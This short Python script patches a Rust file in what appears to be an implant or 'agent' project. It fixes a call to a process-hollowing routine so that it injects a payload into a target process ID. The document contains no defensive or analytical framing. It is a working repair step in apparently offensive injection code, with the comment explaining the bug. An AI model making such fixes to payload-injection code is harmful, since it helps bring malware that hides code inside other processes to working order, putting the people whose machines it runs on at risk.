import re

with open("agent/src/process_manager.rs", "r") as f:
    content = f.read()

# hollowing::inject_into_process expects `pid` u32, but process_manager passed `process` pointer
# fix: let result = hollowing::inject_into_process(target_pid, &payload);

content = content.replace("hollowing::inject_into_process(process, &payload);", "hollowing::inject_into_process(target_pid, &payload);")

with open("agent/src/process_manager.rs", "w") as f:
    f.write(content)

